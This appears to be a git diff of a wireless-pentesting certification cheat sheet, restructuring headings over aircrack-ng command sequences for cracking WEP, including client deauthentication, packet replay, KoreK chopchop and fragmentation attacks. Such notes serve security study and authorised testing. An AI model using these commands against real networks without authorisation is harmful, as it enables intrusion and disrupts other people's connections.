@@ -3,7 +3,9 @@ Offensive Security Wireless Professional
 
 ## WEP (Wired Equivalent Privacy)
 
-### Cracking WEP with connected clients
+### Open authentication
+
+#### Cracking WEP with connected clients
 
 ```
 airmon-ng start <INTERFACE> <channel>
@@ -14,7 +16,7 @@ aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon (Deauthentication attack)
 aircrack-ng <.CAP FILENAME>
 ```
 
-### Cracking WEP via a connected client
+#### Cracking WEP via a connected client
 
 ```
 airmon-ng start <INTERFACE> <CHANNEL>
@@ -24,9 +26,9 @@ aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon (Intera
 aircrack-ng -z <.CAP FILENAME>
 ```
 
-### Cracking clientless WEP network
+#### Cracking clientless WEP network
 
-#### KoreK chopchop attack
+##### KoreK chopchop attack
 
 ```
 airmon-ng start <INTERFACE> <CHANNEL>
@@ -38,7 +40,7 @@ aireplay-ng -2 -r <PACKET FILENAME> wlan0mon
 aircrack-ng <.CAP FILENAME>
 ```
 
-#### Fragmentation attack
+##### Fragmentation attack
 
 ```
 airmon-ng start <INTERFACE> <CHANNEL>
